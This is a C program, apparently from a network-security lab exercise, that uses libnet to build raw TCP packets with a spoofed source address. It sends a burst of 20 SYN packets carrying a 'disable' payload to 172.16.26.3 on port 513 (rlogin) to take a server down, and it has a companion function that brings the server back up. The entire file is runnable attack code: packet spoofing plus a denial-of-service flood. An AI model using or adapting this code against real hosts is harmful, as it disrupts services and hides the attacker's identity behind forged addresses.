#include <libnet.h>
#include <libnet/libnet-functions.h>
#include <libnet/libnet-headers.h>
#include <libnet/libnet-macros.h>
#include <libnet/libnet-structures.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define SERVER_ADDR "172.16.26.3"
#define SERVER_PORT 513

#define RANDOM_ADDR "130.92.6.97"

#define FLOOD_AMMOUNT 20
#define FLOOD_DISABLE "disable"
#define FLOOD_ENABLE "enable"

/*
 * Sends a SYN packet with enable payload to the server to bring it back up
 *
 */
int server_enable(libnet_t *libnet_ctx) {
  /* source and server ips */
  u_long src_ip = libnet_name2addr4(libnet_ctx, RANDOM_ADDR, LIBNET_RESOLVE);
  u_long dst_ip = libnet_name2addr4(libnet_ctx, SERVER_ADDR, LIBNET_RESOLVE);

  printf("\e[33m[*]\e[0m Enabling server @ %s.\n", SERVER_ADDR);

  /* create tcp */
  libnet_ptag_t tcp_h = libnet_build_tcp(
      1337, SERVER_PORT, 50, 50, TH_SYN, 50, 0, 0, LIBNET_TCP_H,
      (const uint8_t *)FLOOD_ENABLE, strlen(FLOOD_ENABLE), libnet_ctx, 0);

  /* build IP header */
  libnet_ptag_t ip_h =
      libnet_build_ipv4(LIBNET_TCP_H + LIBNET_IPV4_H, 0, 0x1337, 0, 100,
                        IPPROTO_TCP, 0, src_ip, dst_ip, NULL, 0, libnet_ctx, 0);

  /* send packet */
  if (libnet_write(libnet_ctx) == -1) {
    printf("\e[31m[!]\e[0m libnet write failed.\n");
    exit(-1);
  }

  return 0;
}

/*
 * Floods the server with 20 SYN disable packets to bring it down
 *
 */
int dos(libnet_t *libnet_ctx) {
  /* source and server ips */
  u_long src_ip = libnet_name2addr4(libnet_ctx, RANDOM_ADDR, LIBNET_RESOLVE);
  u_long dst_ip = libnet_name2addr4(libnet_ctx, SERVER_ADDR, LIBNET_RESOLVE);

  printf("\e[33m[*]\e[0m Flooding %s.\n", SERVER_ADDR);

  /* start flooding */
  libnet_ptag_t tcp_h;
  int ip_built = 0;
  for (int flood_count = 0, tcp_h = LIBNET_PTAG_INITIALIZER;
       flood_count < FLOOD_AMMOUNT; ++flood_count) {

    /*
     * create tcp header
     * first time, tcp_h 0, next times it will modify same header
     */
    tcp_h = libnet_build_tcp(1337, SERVER_PORT, 50, 50, TH_SYN, 50, 0, 0,
                             LIBNET_TCP_H, (const uint8_t *)FLOOD_DISABLE,
                             strlen(FLOOD_DISABLE), libnet_ctx, tcp_h);

    /* build IP header the first time */
    if (!ip_built) {
      ip_built = 1;

      libnet_ptag_t ip_h = libnet_build_ipv4(
          LIBNET_TCP_H + LIBNET_IPV4_H, 0, 0x1337, 0, 100, IPPROTO_TCP, 0,
          src_ip, dst_ip, NULL, 0, libnet_ctx, 0);
    }

    /* send packet */
    if (libnet_write(libnet_ctx) == -1) {
      printf("\e[31m[!]\e[0m libnet write failed.\n");
      exit(-1);
    }
  }

  return 0;
}

int attack(libnet_t *libnet_ctx) {
  printf("\e[33m[*]\e[0m Initiating attack.\n");

  /* do synflood attack to dos the server */
  if (dos(libnet_ctx)) {
    printf("\e[31m[!]\e[0m DOS attack failed.\n");
    exit(-1);
  }
  printf("\e[33m[*]\e[0m DOS attack finished.\n");

  /* check if server is indeed down */
  printf("\e[33m[*]\e[0m Checking whether server is down\n");

  return 0;
}

int main(int argc, char **argv) {
  /* initialize libnet */
  char errbuff[LIBNET_ERRBUF_SIZE];
  libnet_t *libnet_ctx = libnet_init(LIBNET_RAW4, NULL, errbuff);

  if (!libnet_ctx) {
    printf("\e[31m[!]\e[0m Could not initialize libnet, exiting. (%s)\n",
           errbuff);
    exit(-1);
  }

  /* launch attack */
  if (attack(libnet_ctx)) {
    printf("\e[31m[!]\e[0m Attack failed.\n");
    exit(-1);
  }

  printf("\e[33m[*]\e[0m Attack finished.\n");

  /* free libnet */
  libnet_destroy(libnet_ctx);

  return 0;
}
